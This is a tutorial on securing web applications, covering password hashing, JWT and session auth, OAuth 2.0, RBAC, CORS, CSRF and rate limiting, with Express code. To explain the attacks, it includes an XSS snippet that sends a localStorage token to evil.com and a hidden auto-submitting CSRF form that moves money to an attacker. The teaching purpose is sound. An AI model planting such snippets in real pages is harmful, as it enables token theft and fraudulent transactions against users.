---
title: "Authentication and Authorization — Securing Your Application"
description: "JWT, session-based auth, OAuth 2.0, bcrypt, RBAC, CORS, CSRF, and the complete security stack for modern web applications."
order: 9
---

# Authentication and Authorization — Securing Your Application

> **Category:** AWS Infrastructure · **Difficulty:** Intermediate-Advanced · **Related:** JWT · OAuth · bcrypt · RBAC · CORS · Sessions

---

## 01 — TL;DR

- **Authentication** = "Who are you?" (login). **Authorization** = "What can you do?" (permissions)
- Passwords must be hashed with **bcrypt** (salt + cost factor) — never MD5, SHA, or plaintext
- **JWT** (JSON Web Tokens) are stateless tokens: header.payload.signature — the payload is NOT encrypted, only signed
- Store tokens in **httpOnly cookies** (safe from XSS) rather than localStorage (vulnerable to XSS)
- Use **refresh token rotation**: short-lived access tokens (15 min) + long-lived refresh tokens (7 days)
- **OAuth 2.0** delegates authentication to trusted providers (Google, GitHub) without sharing passwords
- **CORS** is a browser security feature — your API must explicitly allow cross-origin requests
- **CSRF** attacks exploit cookies — mitigate with SameSite cookies and CSRF tokens

**Why this matters:** A single authentication flaw can expose every user's data. Auth is the #1 target for attackers — get it wrong and nothing else matters.

---

## 02 — Authentication vs Authorization

### The Core Distinction

| | Authentication (AuthN) | Authorization (AuthZ) |
|---|---|---|
| Question | "Who are you?" | "What can you do?" |
| When | First (must identify before granting access) | After authentication |
| Mechanism | Username/password, OAuth, biometrics | Roles, permissions, policies |
| Failure | 401 Unauthorized | 403 Forbidden |

### The Airport Analogy

```
AIRPORT SECURITY:

1. AUTHENTICATION (ID Check):
   Guard: "Show me your passport"
   You: *shows passport*
   Guard: "OK, you are Santiago Ferrer" ✅
   
   → You've proven WHO you are

2. AUTHORIZATION (Boarding Pass):
   Gate Agent: "Show me your boarding pass"
   You: *shows pass for Flight 123, Seat 14A*
   Gate Agent: "You can board this plane" ✅
   
   → You've proven WHAT you can access

   Alternatively:
   You: *shows pass for Flight 456*
   Gate Agent: "This isn't your gate" ❌ (403 Forbidden)
   
   → You're authenticated (we know who you are)
      but NOT authorized for this resource
```

### In Code

```javascript
// Middleware chain:

// Step 1: AUTHENTICATION — Who is making this request?
function authenticate(req, res, next) {
  const token = req.cookies.accessToken;
  if (!token) return res.status(401).json({ error: 'Not authenticated' });
  
  try {
    const user = jwt.verify(token, SECRET_KEY);
    req.user = user;  // Now we KNOW who they are
    next();
  } catch {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Step 2: AUTHORIZATION — Can this user do this action?
function authorize(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Usage:
app.delete('/api/users/:id', 
  authenticate,           // Must be logged in (401 if not)
  authorize('admin'),     // Must be admin (403 if not)
  deleteUser              // Actually delete the user
);
```

---

## 03 — Password Security

### Why Plaintext is Catastrophic

```
DATABASE BREACH SCENARIO:

If passwords stored as PLAINTEXT:
  users table:
  | email              | password      |
  | alice@ex.com       | MyDog2024!    |  ← Attacker has EVERY password
  | bob@ex.com         | Password123   |  ← Users reuse passwords on other sites
  
  Impact: Every account compromised. Users' bank, email, social media at risk.

If passwords stored as BCRYPT HASH:
  users table:
  | email              | password_hash                                              |
  | alice@ex.com       | $2b$12$LJ3m4gKzq7KqLwuG9v.Gu.3j8kN9ZfKqVzUmX6.o2JxCq... |
  | bob@ex.com         | $2b$12$xQ7p4gWzk2LqOwyH0w.Iv.9n0mR8YgMrWzVnY7.p3KyDr... |
  
  Impact: Attacker has USELESS hashes. Can't reverse them. Can't log in anywhere.
```

### Hashing vs Encryption

| | Hashing (one-way) | Encryption (two-way) |
|---|---|---|
| Can you get original back? | ❌ No (irreversible) | ✅ Yes (with key) |
| Use for passwords? | ✅ Yes | ❌ No |
| Use for credit cards? | ❌ No (need to read them) | ✅ Yes |
| Example | bcrypt, argon2 | AES-256, RSA |

### Why MD5/SHA Are Bad for Passwords

```
MD5('password123')  → computed in 0.000001 seconds
SHA256('password123') → computed in 0.000001 seconds

Modern GPU can compute:
  - 50 BILLION MD5 hashes/second
  - 15 BILLION SHA256 hashes/second

Brute force "password123" from MD5 hash: < 1 second
Brute force a random 8-char password: hours

bcrypt('password123', cost=12) → computed in 0.3 seconds

Brute force with bcrypt: 
  - 3 hashes/second per GPU (not 50 billion!)
  - Random 8-char password: thousands of years
```

### bcrypt: The Right Choice

```javascript
const bcrypt = require('bcrypt');

// REGISTRATION — Hash the password
async function registerUser(email, plainPassword) {
  const COST_FACTOR = 12;  // 2^12 = 4096 iterations (~300ms)
  
  // bcrypt automatically:
  // 1. Generates a random salt (prevents rainbow tables)
  // 2. Hashes password + salt with COST_FACTOR iterations
  const hash = await bcrypt.hash(plainPassword, COST_FACTOR);
  
  // Store the hash (salt is embedded in it)
  // $2b$12$LJ3m4gKzq7KqLwuG9v.Gu.3j8kN9ZfKqVzUmX6.o2JxCq...
  // ─┬─ ─┬─ ──────┬─────────── ──────────┬──────────────────
  //  │    │        │                       │
  // algo cost   salt (22 chars)        hash (31 chars)
  
  await db.query(
    'INSERT INTO users (email, password_hash) VALUES ($1, $2)',
    [email, hash]
  );
}

// LOGIN — Verify the password
async function loginUser(email, plainPassword) {
  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  if (!user) return null;  // Don't reveal if email exists!
  
  // Timing-safe comparison (prevents timing attacks)
  const valid = await bcrypt.compare(plainPassword, user.password_hash);
  if (!valid) return null;
  
  return user;  // Password matches!
}
```

### Cost Factor Guidelines

| Cost Factor | Time per Hash | Use Case |
|-------------|--------------|----------|
| 10 | ~100ms | Minimum acceptable |
| 12 | ~300ms | Good default ✅ |
| 14 | ~1 second | High security |
| 16 | ~4 seconds | Too slow for UX |

> Increase cost factor as hardware gets faster. Re-hash on login if cost has increased.

---

## 04 — JWT (JSON Web Tokens)

### Three Parts

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└──────────── HEADER ─────────────┘.└────────────────── PAYLOAD ──────────────────────────┘.└────────── SIGNATURE ──────────┘
```

**Decoded:**

```json
// HEADER (base64url decoded)
{
  "alg": "HS256",    // Algorithm used for signature
  "typ": "JWT"       // Token type
}

// PAYLOAD (base64url decoded) — ⚠️ NOT ENCRYPTED!
{
  "sub": "1234567890",    // Subject (user ID)
  "name": "John",         // Custom claim
  "role": "admin",        // Custom claim
  "iat": 1516239022,      // Issued At
  "exp": 1516239922       // Expiration (15 min from iat)
}

// SIGNATURE
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  your-256-bit-secret    // Only the server knows this!
)
```

### Critical Understanding

```
⚠️ THE PAYLOAD IS NOT ENCRYPTED!

Base64 is encoding, NOT encryption. Anyone can decode a JWT payload:

$ echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ" | base64 -d
{"sub":"1234567890","name":"John"}

NEVER put sensitive data in the JWT payload:
  ❌ credit card numbers
  ❌ social security numbers  
  ❌ private messages
  ❌ full password hashes

WHAT TO PUT in the payload:
  ✅ user ID
  ✅ role (admin, user)
  ✅ email (for display)
  ✅ expiration time
```

### How Signing Prevents Tampering

```
What stops a user from changing their role to "admin"?

STEP 1: Server creates JWT
  payload: {"userId": 42, "role": "user"}
  signature: HMAC(header + payload, SECRET_KEY) = "abc123..."

STEP 2: Attacker intercepts and modifies
  payload: {"userId": 42, "role": "admin"}  ← CHANGED!
  signature: "abc123..."  ← OLD signature (doesn't match new payload!)

STEP 3: Server receives modified JWT
  Recalculates: HMAC(header + new_payload, SECRET_KEY) = "xyz789..."
  Compares with received signature: "abc123..." ≠ "xyz789..."
  → REJECTED! Signature mismatch.

The attacker can't forge a valid signature because they don't know SECRET_KEY.
```

---

## 05 — JWT Auth Flow

### Complete Implementation

```javascript
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET;   // Strong random key
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET; // Different key!
const ACCESS_EXPIRY = '15m';
const REFRESH_EXPIRY = '7d';

// ─── REGISTRATION ────────────────────────────────────────
app.post('/api/auth/register', async (req, res) => {
  const { email, password, name } = req.body;
  
  // Validate input
  if (password.length < 8) {
    return res.status(400).json({ error: 'Password too short' });
  }
  
  // Check if user exists
  const existing = await db.query('SELECT id FROM users WHERE email = $1', [email]);
  if (existing.rows.length > 0) {
    return res.status(409).json({ error: 'Email already registered' });
  }
  
  // Hash password and create user
  const hash = await bcrypt.hash(password, 12);
  const result = await db.query(
    'INSERT INTO users (email, password_hash, name) VALUES ($1, $2, $3) RETURNING id',
    [email, hash, name]
  );
  
  res.status(201).json({ message: 'User created', userId: result.rows[0].id });
});

// ─── LOGIN ───────────────────────────────────────────────
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Find user
  const result = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  const user = result.rows[0];
  
  // Generic error (don't reveal if email exists)
  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    ACCESS_SECRET,
    { expiresIn: ACCESS_EXPIRY }
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id, tokenVersion: user.token_version },
    REFRESH_SECRET,
    { expiresIn: REFRESH_EXPIRY }
  );
  
  // Store refresh token hash in DB (for revocation)
  await db.query(
    'UPDATE users SET refresh_token_hash = $1 WHERE id = $2',
    [await bcrypt.hash(refreshToken, 10), user.id]
  );
  
  // Send as httpOnly cookies (safe from XSS)
  res.cookie('accessToken', accessToken, {
    httpOnly: true,     // JavaScript can't access
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 15 * 60 * 1000,  // 15 minutes
  });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth/refresh',  // Only sent to refresh endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  });
  
  res.json({ message: 'Login successful', user: { id: user.id, email: user.email } });
});

// ─── PROTECTED ROUTE MIDDLEWARE ──────────────────────────
function authenticate(req, res, next) {
  const token = req.cookies.accessToken;
  if (!token) return res.status(401).json({ error: 'Access token required' });
  
  try {
    const decoded = jwt.verify(token, ACCESS_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// ─── REFRESH TOKEN ENDPOINT ─────────────────────────────
app.post('/api/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!refreshToken) return res.status(401).json({ error: 'Refresh token required' });
  
  try {
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
    
    // Verify token version (for revocation)
    const user = await db.query('SELECT * FROM users WHERE id = $1', [decoded.userId]);
    if (!user.rows[0] || user.rows[0].token_version !== decoded.tokenVersion) {
      return res.status(401).json({ error: 'Token revoked' });
    }
    
    // Issue new access token
    const newAccessToken = jwt.sign(
      { userId: user.rows[0].id, email: user.rows[0].email, role: user.rows[0].role },
      ACCESS_SECRET,
      { expiresIn: ACCESS_EXPIRY }
    );
    
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true, secure: true, sameSite: 'strict',
      maxAge: 15 * 60 * 1000,
    });
    
    res.json({ message: 'Token refreshed' });
  } catch {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// ─── LOGOUT ──────────────────────────────────────────────
app.post('/api/auth/logout', authenticate, async (req, res) => {
  // Invalidate refresh token by bumping version
  await db.query(
    'UPDATE users SET token_version = token_version + 1, refresh_token_hash = NULL WHERE id = $1',
    [req.user.userId]
  );
  
  // Clear cookies
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken', { path: '/api/auth/refresh' });
  res.json({ message: 'Logged out' });
});

// ─── USAGE ───────────────────────────────────────────────
app.get('/api/profile', authenticate, async (req, res) => {
  const user = await db.query('SELECT id, email, name FROM users WHERE id = $1', [req.user.userId]);
  res.json(user.rows[0]);
});
```

---

## 06 — Token Storage

### The Tradeoff Matrix

| Storage | XSS Safe? | CSRF Safe? | Persists? | Notes |
|---------|-----------|-----------|-----------|-------|
| localStorage | ❌ JS can read | ✅ Not sent auto | ✅ Yes | Most vulnerable to XSS |
| sessionStorage | ❌ JS can read | ✅ Not sent auto | ❌ Tab only | Lost on tab close |
| httpOnly Cookie | ✅ JS can't read | ❌ Sent automatically | ✅ Yes | Best option with SameSite |
| httpOnly + SameSite=Strict | ✅ | ✅ | ✅ | **Best overall** ✅ |

### Why localStorage is Dangerous

```javascript
// If your site has ANY XSS vulnerability (even in a third-party script):

// Attacker injects:
<script>
  // Game over — they have your token
  const token = localStorage.getItem('accessToken');
  fetch('https://evil.com/steal?token=' + token);
</script>

// With httpOnly cookies, this attack FAILS:
<script>
  document.cookie  // ← httpOnly cookies are NOT visible here
  // Attacker gets nothing!
</script>
```

---

## 07 — Refresh Tokens

### Why Two Tokens?

```
PROBLEM: Short-lived access tokens (15 min) are secure but annoying.
         User must re-login every 15 minutes? Terrible UX!

PROBLEM: Long-lived access tokens (7 days) are convenient but dangerous.
         If stolen, attacker has 7 days of access.

SOLUTION: Two tokens with different lifespans.

┌──────────────────────────────────────────────────────────────────┐
│                                                                    │
│  Access Token (15 min)         Refresh Token (7 days)             │
│  ┌─────────────────────┐      ┌─────────────────────────┐       │
│  │ Sent with EVERY      │      │ Sent ONLY to /refresh    │       │
│  │ API request           │      │ endpoint                 │       │
│  │                       │      │                         │       │
│  │ If stolen: attacker   │      │ If stolen: attacker can │       │
│  │ has 15 min access     │      │ get new access tokens   │       │
│  │ (limited damage)      │      │ (detect + revoke)       │       │
│  └─────────────────────┘      └─────────────────────────┘       │
│                                                                    │
│  Refresh Flow:                                                     │
│  1. Access token expires (401 response)                           │
│  2. Client calls POST /api/auth/refresh (refresh token in cookie) │
│  3. Server validates refresh token                                │
│  4. Server issues NEW access token                                │
│  5. Client retries original request                               │
│  User never notices! Seamless experience.                         │
│                                                                    │
└──────────────────────────────────────────────────────────────────┘
```

### Refresh Token Rotation

```
ROTATION: Each time a refresh token is used, issue a NEW one.
          The old one is invalidated.

Why? If an attacker steals a refresh token and uses it:
  - They get a new access token + new refresh token
  - The REAL user's next refresh attempt fails (old token invalid)
  - Server detects anomaly → revoke ALL tokens for that user
  - User must re-login, attacker's stolen token is now invalid too

This is called "automatic reuse detection."
```

---

## 08 — Session-Based Auth

### How It Works

```
┌──────────┐                    ┌──────────────┐                ┌─────────┐
│  Client  │                    │   Server     │                │  Redis  │
│ (Browser)│                    │  (Express)   │                │  (Store)│
└────┬─────┘                    └──────┬───────┘                └────┬────┘
     │                                 │                              │
     │  POST /login {email, pass}      │                              │
     │────────────────────────────────►│                              │
     │                                 │  Generate session ID         │
     │                                 │  (random 128-bit string)     │
     │                                 │                              │
     │                                 │  Store: sessionId → userData │
     │                                 │─────────────────────────────►│
     │                                 │                              │
     │  Set-Cookie: sid=abc123;        │                              │
     │  httpOnly; secure               │                              │
     │◄────────────────────────────────│                              │
     │                                 │                              │
     │  GET /api/profile               │                              │
     │  Cookie: sid=abc123             │                              │
     │────────────────────────────────►│                              │
     │                                 │  Lookup: abc123 → userData   │
     │                                 │─────────────────────────────►│
     │                                 │◄─────────────────────────────│
     │                                 │  Found! User is authenticated│
     │  200 {name: "John", ...}        │                              │
     │◄────────────────────────────────│                              │
```

### JWT vs Sessions

| Factor | JWT (Stateless) | Sessions (Stateful) |
|--------|----------------|---------------------|
| Server storage | ❌ None needed | ✅ Redis/DB per user |
| Scalability | ✅ Any server can validate | ⚠️ Need shared session store |
| Revocation | ⚠️ Hard (wait for expiry) | ✅ Delete from store instantly |
| Token size | ~500 bytes (grows with claims) | ~32 bytes (just session ID) |
| Horizontal scaling | ✅ Trivial | ⚠️ Need sticky sessions or shared store |
| Mobile/API clients | ✅ Natural fit | ⚠️ Cookies can be awkward |
| Microservices | ✅ Self-contained, no DB call | ⚠️ Every service needs store access |

### Tech Lead Decision

```
CHOOSE JWT WHEN:
  ✅ Microservices architecture (services validate independently)
  ✅ Mobile app + web app (shared auth)
  ✅ Stateless APIs
  ✅ Short-lived actions (no long-lived sessions needed)

CHOOSE SESSIONS WHEN:
  ✅ Single monolithic server
  ✅ Need instant revocation ("logout from all devices NOW")
  ✅ Sensitive financial/healthcare applications
  ✅ You already have Redis infrastructure
  ✅ You want smaller cookie size (32 bytes vs 500+)
```

---

## 09 — OAuth 2.0

### Why OAuth Exists

```
WITHOUT OAUTH (old world):
  "Log in with Google" → User gives YOUR app their Google password
  ❌ You now have their Gmail password
  ❌ If your DB is breached, their Google account is compromised
  ❌ User can't revoke your access without changing their Google password

WITH OAUTH 2.0:
  "Log in with Google" → User authorizes on Google's site → You get a TOKEN
  ✅ You never see their password
  ✅ Token has limited scope (email only, not full Gmail access)
  ✅ User can revoke your token anytime from Google settings
```

### Authorization Code Flow (Step by Step)

```
┌──────────┐     ┌──────────────┐     ┌───────────────────┐     ┌──────────────┐
│  User    │     │  Your App    │     │  Google Auth      │     │  Google API  │
│ (Browser)│     │  (Backend)   │     │  Server           │     │  (Resource)  │
└────┬─────┘     └──────┬───────┘     └────────┬──────────┘     └──────┬───────┘
     │                   │                       │                       │
     │ 1. Click "Login   │                       │                       │
     │    with Google"   │                       │                       │
     │──────────────────►│                       │                       │
     │                   │                       │                       │
     │ 2. Redirect to Google                     │                       │
     │◄──────────────────│                       │                       │
     │   302 → https://accounts.google.com/      │                       │
     │         oauth/authorize?                   │                       │
     │         client_id=xxx&                     │                       │
     │         redirect_uri=https://myapp.com/    │                       │
     │         callback&scope=email+profile&      │                       │
     │         state=random123                    │                       │
     │                   │                       │                       │
     │ 3. User sees Google consent screen        │                       │
     │──────────────────────────────────────────►│                       │
     │   "MyApp wants to access your email"      │                       │
     │   [Allow] [Deny]                          │                       │
     │                   │                       │                       │
     │ 4. User clicks Allow                      │                       │
     │   Google redirects back to your app       │                       │
     │◄──────────────────────────────────────────│                       │
     │   302 → https://myapp.com/callback?       │                       │
     │         code=AUTH_CODE_XYZ&               │                       │
     │         state=random123                    │                       │
     │                   │                       │                       │
     │ 5. Your backend receives the code         │                       │
     │──────────────────►│                       │                       │
     │                   │                       │                       │
     │                   │ 6. Exchange code for  │                       │
     │                   │    tokens (server-    │                       │
     │                   │    to-server, secret) │                       │
     │                   │──────────────────────►│                       │
     │                   │   POST /oauth/token   │                       │
     │                   │   {code, secret,      │                       │
     │                   │    redirect_uri}      │                       │
     │                   │                       │                       │
     │                   │◄──────────────────────│                       │
     │                   │   {access_token,      │                       │
     │                   │    refresh_token,     │                       │
     │                   │    id_token}          │                       │
     │                   │                       │                       │
     │                   │ 7. Use token to get   │                       │
     │                   │    user info          │                       │
     │                   │──────────────────────────────────────────────►│
     │                   │   GET /userinfo       │                       │
     │                   │   Authorization:      │                       │
     │                   │   Bearer {token}      │                       │
     │                   │◄─────────────────────────────────────────────│
     │                   │   {email, name, pic}  │                       │
     │                   │                       │                       │
     │ 8. Create session │                       │                       │
     │    or JWT for user│                       │                       │
     │◄──────────────────│                       │                       │
     │   Set-Cookie:     │                       │                       │
     │   accessToken=... │                       │                       │
```

### OAuth Roles

| Role | Who | Example |
|------|-----|---------|
| Resource Owner | The user | The person logging in |
| Client | Your application | myapp.com |
| Authorization Server | Login provider | accounts.google.com |
| Resource Server | API with user data | googleapis.com/userinfo |

---

## 10 — Authorization Patterns

### RBAC (Role-Based Access Control)

```javascript
// Define roles and permissions
const PERMISSIONS = {
  admin:     ['read', 'write', 'delete', 'manage_users'],
  editor:    ['read', 'write'],
  viewer:    ['read'],
  moderator: ['read', 'write', 'delete_comments'],
};

// Middleware factory
function requirePermission(permission) {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = PERMISSIONS[userRole] || [];
    
    if (!userPermissions.includes(permission)) {
      return res.status(403).json({ 
        error: 'Forbidden',
        required: permission,
        your_role: userRole
      });
    }
    next();
  };
}

// Usage
app.get('/api/posts', requirePermission('read'), getPosts);
app.post('/api/posts', requirePermission('write'), createPost);
app.delete('/api/posts/:id', requirePermission('delete'), deletePost);
app.get('/api/admin/users', requirePermission('manage_users'), listUsers);
```

### Resource-Based Authorization

```javascript
// "Can this user edit THIS specific post?"
async function canEditPost(req, res, next) {
  const post = await db.query('SELECT author_id FROM posts WHERE id = $1', [req.params.id]);
  
  if (!post.rows[0]) {
    return res.status(404).json({ error: 'Post not found' });
  }
  
  const isAuthor = post.rows[0].author_id === req.user.userId;
  const isAdmin = req.user.role === 'admin';
  
  if (!isAuthor && !isAdmin) {
    return res.status(403).json({ error: 'You can only edit your own posts' });
  }
  
  next();
}

app.put('/api/posts/:id', authenticate, canEditPost, updatePost);
```

---

## 11 — CORS (Cross-Origin Resource Sharing)

### What Is It?

```
SAME-ORIGIN POLICY (browser security):
  A page at https://myapp.com can ONLY make requests to https://myapp.com
  
  ✅ https://myapp.com → https://myapp.com/api/users  (same origin)
  ❌ https://myapp.com → https://api.myapp.com/users  (different subdomain = different origin!)
  ❌ https://myapp.com → https://myapp.com:8080/users (different port!)
  ❌ http://myapp.com  → https://myapp.com/users      (different protocol!)

WHY? Without this, evil.com could make requests to your bank's API
     using YOUR cookies (you're logged in), stealing your data.

CORS = the mechanism for servers to say "I allow requests from these other origins"
```

### Preflight Requests

```
When the browser wants to make a "complex" request cross-origin,
it first sends an OPTIONS request (preflight):

Browser → Server: "Hey, can https://frontend.com make a POST with JSON?"

OPTIONS /api/users
Host: api.backend.com
Origin: https://frontend.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

Server → Browser: "Yes, that's allowed"

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  (cache this for 24h, don't ask again)

Browser: "OK, now I'll send the actual request"
POST /api/users ...
```

### Express CORS Configuration

```javascript
const cors = require('cors');

// DEVELOPMENT (permissive)
app.use(cors({
  origin: 'http://localhost:3000',  // React dev server
  credentials: true,                 // Allow cookies
}));

// PRODUCTION (strict)
app.use(cors({
  origin: ['https://myapp.com', 'https://www.myapp.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,  // Cache preflight for 24 hours
}));

// ❌ NEVER IN PRODUCTION:
app.use(cors({ origin: '*' }));  // Allows ANY website to call your API!
```

> **⚠️ What would go wrong if...** CORS isn't configured?
> Your React frontend at `https://myapp.com` tries to call your API at `https://api.myapp.com`. Browser blocks the request with: `Access to XMLHttpRequest has been blocked by CORS policy`. Your app is completely broken for end users (even though curl works fine — CORS is browser-only).

---

## 12 — CSRF Protection

### What Is CSRF?

```
SCENARIO: You're logged into your bank (bank.com) — session cookie active.

1. You visit evil.com (phishing email link)
2. evil.com has hidden HTML:
   <img src="https://bank.com/transfer?to=attacker&amount=10000" />
   
   Or worse:
   <form action="https://bank.com/transfer" method="POST" id="x">
     <input name="to" value="attacker" />
     <input name="amount" value="10000" />
   </form>
   <script>document.getElementById('x').submit();</script>

3. Your browser sends this request TO YOUR BANK
   WITH YOUR COOKIES (you're logged in!)
   
4. Bank sees: valid session cookie → processes transfer 💸

THE BROWSER AUTOMATICALLY ATTACHES COOKIES FOR THE DESTINATION DOMAIN.
This is the fundamental problem.
```

### Protection Mechanisms

```javascript
// 1. SameSite Cookie (BEST — built into cookies)
res.cookie('sessionId', id, {
  sameSite: 'strict',  // Cookie NOT sent on cross-origin requests
  // 'lax' = sent on top-level navigations (GET) but not POST
  // 'strict' = never sent cross-origin (safest)
  // 'none' = always sent (must have secure:true, used for SSO)
});

// 2. CSRF Token (traditional approach)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Generate token (embed in form)
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Validate token on submission
app.post('/transfer', csrfProtection, (req, res) => {
  // csurf middleware validates the _csrf field matches
  processTransfer(req.body);
});

// 3. Double-Submit Cookie Pattern
// Set a random CSRF token in both a cookie AND a header
// Server checks they match (attacker can't read the cookie to put in header)
```

### Protection Comparison

| Method | Ease | Effectiveness | Notes |
|--------|------|--------------|-------|
| SameSite=Strict | ✅ Easy | ✅ High | May break some legitimate cross-site flows |
| SameSite=Lax | ✅ Easy | 🟡 Medium | Allows GET navigations (safe for most) |
| CSRF Token | 🟡 Medium | ✅ High | Need to embed in every form |
| Double-Submit Cookie | 🟡 Medium | ✅ High | Stateless, works with SPAs |
| Check Origin/Referer | ✅ Easy | 🟡 Medium | Headers can be suppressed |

---

## 13 — Security Best Practices

### Rate Limiting on Login

```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15-minute window
  max: 5,                       // 5 attempts per window
  message: { error: 'Too many login attempts. Try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
  // Key by IP + email to prevent distributed attacks
  keyGenerator: (req) => `${req.ip}-${req.body?.email || 'unknown'}`,
});

app.post('/api/auth/login', loginLimiter, loginHandler);
```

### Account Lockout

```javascript
async function loginHandler(req, res) {
  const { email, password } = req.body;
  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  
  if (!user.rows[0]) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Check lockout
  if (user.rows[0].locked_until && new Date(user.rows[0].locked_until) > new Date()) {
    return res.status(423).json({ error: 'Account locked. Try again later.' });
  }
  
  const valid = await bcrypt.compare(password, user.rows[0].password_hash);
  
  if (!valid) {
    // Increment failed attempts
    const attempts = user.rows[0].failed_attempts + 1;
    const lockUntil = attempts >= 5 
      ? new Date(Date.now() + 30 * 60 * 1000)  // Lock for 30 min after 5 failures
      : null;
    
    await db.query(
      'UPDATE users SET failed_attempts = $1, locked_until = $2 WHERE id = $3',
      [attempts, lockUntil, user.rows[0].id]
    );
    
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Reset on successful login
  await db.query(
    'UPDATE users SET failed_attempts = 0, locked_until = NULL WHERE id = $1',
    [user.rows[0].id]
  );
  
  // ... issue tokens
}
```

### Password Policy (The NIST Debate)

```
OLD RULES (annoying, counterproductive):
  ❌ Must have uppercase, lowercase, number, special char
  ❌ Must change every 90 days
  ❌ Can't reuse last 10 passwords
  Result: "P@ssw0rd1!" → "P@ssw0rd2!" → "P@ssw0rd3!" (predictable!)

NIST SP 800-63B RECOMMENDATIONS (modern, evidence-based):
  ✅ Minimum 8 characters (preferably 12+)
  ✅ Check against breached password lists (haveibeenpwned)
  ✅ No composition rules (let users choose passphrases)
  ✅ No mandatory rotation (only change if compromised)
  ✅ Allow all printable characters + spaces
  Result: "correct horse battery staple" (easy to remember, hard to crack!)
```

### Security Headers

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{random}'"],
      styleSrc: ["'self'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.myapp.com"],
      frameSrc: ["'none'"],  // Prevent clickjacking
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

---

## 14 — Production Security Checklist

| Area | Check | Status |
|------|-------|--------|
| **Passwords** | bcrypt with cost ≥ 12 | ⬜ |
| | Breached password check (haveibeenpwned API) | ⬜ |
| | No password in logs/error messages | ⬜ |
| **Tokens** | Access token ≤ 15 min expiry | ⬜ |
| | Refresh token rotation enabled | ⬜ |
| | Tokens in httpOnly + secure + sameSite cookies | ⬜ |
| | Strong secret key (≥256 bits, from env var) | ⬜ |
| **API** | Rate limiting on auth endpoints | ⬜ |
| | Account lockout after N failures | ⬜ |
| | Generic error messages (don't reveal email existence) | ⬜ |
| | Input validation on all endpoints | ⬜ |
| **Transport** | HTTPS everywhere (HSTS enabled) | ⬜ |
| | TLS 1.2+ only (disable older protocols) | ⬜ |
| **CORS** | Explicit origin whitelist (no wildcards) | ⬜ |
| | credentials: true only for your domains | ⬜ |
| **CSRF** | SameSite=Strict or Lax on all cookies | ⬜ |
| | CSRF tokens on state-changing requests | ⬜ |
| **Headers** | Content-Security-Policy | ⬜ |
| | X-Content-Type-Options: nosniff | ⬜ |
| | X-Frame-Options: DENY | ⬜ |
| | Strict-Transport-Security | ⬜ |
| **Database** | Parameterized queries (no SQL injection) | ⬜ |
| | Credentials in Secrets Manager (not env) | ⬜ |
| **Monitoring** | Alert on auth failure spikes | ⬜ |
| | Log all auth events (login, logout, failures) | ⬜ |
| | 2FA/MFA for admin accounts | ⬜ |

---

## 15 — Common Pitfalls and "What Would Go Wrong"

| Scenario | What Goes Wrong | Fix |
|----------|----------------|-----|
| JWT secret key leaked | Attacker can forge ANY token, impersonate any user | Rotate keys immediately; use RS256 (asymmetric) in production |
| Tokens never expire | Stolen token = permanent access. No way to revoke | Short-lived access tokens (15 min) + refresh rotation |
| JWT in localStorage | Any XSS vulnerability exposes all user tokens | httpOnly cookies (JS can't access) |
| No CORS configured | Frontend gets blocked by browser; OR `origin: *` allows anyone | Explicit origin whitelist in production |
